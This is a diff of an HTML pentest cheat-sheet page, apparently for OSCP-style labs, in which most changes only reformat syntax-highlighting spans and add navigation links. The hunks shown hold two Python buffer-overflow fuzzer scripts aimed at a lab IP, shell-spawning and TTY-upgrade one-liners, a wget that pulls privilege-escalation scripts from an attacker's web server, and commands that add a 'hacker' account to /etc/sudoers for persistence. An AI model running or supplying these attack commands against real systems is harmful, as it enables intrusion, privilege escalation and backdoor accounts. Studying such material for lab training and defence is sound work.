@@ -21,7 +21,8 @@
             <ul>
                 <li><a href="https://sfinx.kozow.com/">Home</a></li>
                 <li><a href="https://github.com/Medaz-Sploit">GitHub</a></li>
-                <li><a href="https://sfinx.kozow.com/authors">Authors</a></li>
+                <li><a href="https://sfinx.kozow.com/category/web.html">PortSwigger</a></li>
+                <li><a href="https://sfinx.kozow.com/category/htb.html">HTB</a></li>
                 <li><a href="https://sfinx.kozow.com/categories">Categories</a></li>
             </ul>
         </nav>
@@ -1155,50 +1156,50 @@ http://cracker.offensive-security.com/
 <div class="highlight"><pre><span></span><code><span class="c1">################ sample 1 ################################################</span>
 <span class="c1">#!/usr/bin/python</span>
 
-<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="o">,</span><span class="nn">sys</span>
 
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;usage: python fuzzer.py 10.11.1.111 PORT&quot;</span><span class="p">)</span>
-    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
+<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;usage: python fuzzer.py 10.11.1.111 PORT&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">1000</span>
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1000</span>
 
-<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">ipAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
 
 <span class="k">try</span><span class="p">:</span>
-    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-    <span class="nb">print</span> <span class="s2">&quot;Sending payload&quot;</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="nb">print</span> <span class="s2">&quot;Done&quot;</span>
-    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="w">    </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">))</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="w">    </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;Sending payload&quot;</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="w">    </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;Done&quot;</span>
+<span class="w">    </span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 <span class="k">except</span><span class="p">:</span>
-    <span class="nb">print</span> <span class="s2">&quot;Error&quot;</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="w">    </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;Error&quot;</span>
+<span class="w">    </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
 <span class="c1">################ sample 2 ################################################</span>
 <span class="c1">#!/usr/bin/python</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">socket</span> <span class="k">as</span> <span class="nn">so</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span><span class="o">,</span><span class="w"> </span><span class="nn">struct</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">so</span>
 
 <span class="k">try</span><span class="p">:</span>
-    <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="n">port</span> <span class="o">=</span> <span class="mi">5555</span>
-<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
-    <span class="nb">print</span> <span class="s2">&quot;[+] Usage </span><span class="si">%s</span><span class="s2"> host&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+<span class="w">    </span><span class="n">server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="w">    </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5555</span>
+<span class="k">except</span><span class="w"> </span><span class="n">IndexError</span><span class="p">:</span>
+<span class="w">    </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;[+] Usage </span><span class="si">%s</span><span class="s2"> host&quot;</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="w">    </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
-<span class="n">req1</span> <span class="o">=</span> <span class="s2">&quot;AUTH &quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">1072</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">so</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">so</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">so</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">req1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;AUTH &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">1072</span>
+<span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">so</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">so</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">so</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="k">try</span><span class="p">:</span>
-     <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
-     <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
-     <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">req1</span><span class="p">)</span>
-     <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+<span class="w">     </span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">))</span>
+<span class="w">     </span><span class="nb">print</span><span class="w"> </span><span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+<span class="w">     </span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">req1</span><span class="p">)</span>
+<span class="w">     </span><span class="nb">print</span><span class="w"> </span><span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
 <span class="k">except</span><span class="p">:</span>
-     <span class="nb">print</span> <span class="s2">&quot;[!] connection refused, check debugger&quot;</span>
+<span class="w">     </span><span class="nb">print</span><span class="w"> </span><span class="s2">&quot;[!] connection refused, check debugger&quot;</span>
 <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div>
 
@@ -1311,51 +1312,51 @@ http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&a
 </ul>
 <h3>Useful commands</h3>
 <div class="highlight"><pre><span></span><code><span class="c1"># Spawning shell</span>
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
-<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 <span class="n">V</span>
 <span class="n">Ctrl</span><span class="o">+</span><span class="n">Z</span>
-<span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span>
+<span class="n">stty</span><span class="w"> </span><span class="n">raw</span><span class="w"> </span><span class="o">-</span><span class="n">echo</span>
 <span class="n">fg</span>
 <span class="n">reset</span>
 <span class="n">Ctrl</span><span class="o">+</span><span class="n">Z</span>
-<span class="n">stty</span> <span class="n">size</span>
-<span class="n">stty</span> <span class="o">-</span><span class="n">rows</span> <span class="mi">48</span> <span class="o">-</span><span class="n">columns</span> <span class="mi">120</span>
+<span class="n">stty</span><span class="w"> </span><span class="n">size</span>
+<span class="n">stty</span><span class="w"> </span><span class="o">-</span><span class="n">rows</span><span class="w"> </span><span class="mi">48</span><span class="w"> </span><span class="o">-</span><span class="n">columns</span><span class="w"> </span><span class="mi">120</span>
 <span class="n">fg</span>
 
-<span class="n">echo</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
-<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span>
-<span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
-<span class="n">perl</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
-<span class="n">ruby</span><span class="p">:</span> <span class="n">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
-<span class="n">lua</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
-<span class="p">(</span><span class="n">From</span> <span class="n">within</span> <span class="n">vi</span><span class="p">)</span>
+<span class="n">echo</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">)</span>
+<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span>
+<span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
+<span class="n">perl</span><span class="p">:</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
+<span class="n">ruby</span><span class="p">:</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
+<span class="n">lua</span><span class="p">:</span><span class="w"> </span><span class="n">os</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="p">(</span><span class="n">From</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">vi</span><span class="p">)</span>
 <span class="p">:</span><span class="err">!</span><span class="n">bash</span>
-<span class="p">:</span><span class="nb">set</span> <span class="n">shell</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="n">shell</span>
-<span class="p">(</span><span class="n">From</span> <span class="n">within</span> <span class="n">nmap</span><span class="p">)</span>
+<span class="p">:</span><span class="nb">set</span><span class="w"> </span><span class="n">shell</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="n">shell</span>
+<span class="p">(</span><span class="n">From</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">nmap</span><span class="p">)</span>
 <span class="err">!</span><span class="n">sh</span>
 
 <span class="c1"># Access to more binaries</span>
-<span class="n">export</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span>
+<span class="n">export</span><span class="w"> </span><span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span>
 
 <span class="c1"># Set up webserver</span>
-<span class="n">cd</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">useful</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">privesc</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">privesc</span><span class="o">-</span><span class="n">scripts</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span> <span class="mi">8080</span><span class="p">;</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">oscp</span><span class="o">/</span><span class="n">useful</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">privesc</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">privesc</span><span class="o">-</span><span class="n">scripts</span><span class="p">;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">SimpleHTTPServer</span><span class="w"> </span><span class="mi">8080</span><span class="p">;</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">server</span><span class="w"> </span><span class="mi">80</span>
 
 <span class="c1"># Download all files</span>
-<span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span> <span class="o">-</span><span class="n">r</span><span class="p">;</span> <span class="n">mv</span> <span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span> <span class="n">exploits</span><span class="p">;</span> <span class="n">cd</span> <span class="n">exploits</span><span class="p">;</span> <span class="n">rm</span> <span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="p">;</span> <span class="n">chmod</span> <span class="mi">700</span> <span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span> <span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span> <span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span>
+<span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="p">;</span><span class="w"> </span><span class="n">mv</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="p">:</span><span class="mi">8080</span><span class="w"> </span><span class="n">exploits</span><span class="p">;</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">exploits</span><span class="p">;</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="p">;</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">700</span><span class="w"> </span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span>
 
-<span class="o">./</span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span> <span class="o">-</span><span class="n">t</span> <span class="o">-</span><span class="n">k</span> <span class="n">password</span> <span class="o">-</span><span class="n">r</span> <span class="n">LinEnum</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">python</span> <span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span> <span class="n">extended</span>
-<span class="o">./</span><span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span> <span class="n">standard</span>
+<span class="o">./</span><span class="n">LinEnum</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">LinEnum</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">python</span><span class="w"> </span><span class="n">linprivchecker</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="n">extended</span>
+<span class="o">./</span><span class="n">unix</span><span class="o">-</span><span class="n">privesc</span><span class="o">-</span><span class="n">check</span><span class="w"> </span><span class="n">standard</span>
 
 <span class="c1"># Writable directories</span>
 <span class="o">/</span><span class="n">tmp</span>
 <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span>
 
 <span class="c1"># Add user to sudoers</span>
-<span class="n">useradd</span> <span class="n">hacker</span>
-<span class="n">passwd</span> <span class="n">hacker</span>
-<span class="n">echo</span> <span class="s2">&quot;hacker ALL=(ALL:ALL) ALL&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
+<span class="n">useradd</span><span class="w"> </span><span class="n">hacker</span>
+<span class="n">passwd</span><span class="w"> </span><span class="n">hacker</span>
+<span class="n">echo</span><span class="w"> </span><span class="s2">&quot;hacker ALL=(ALL:ALL) ALL&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">sudoers</span>
 </code></pre></div>
 
 <h3>Basic info</h3>
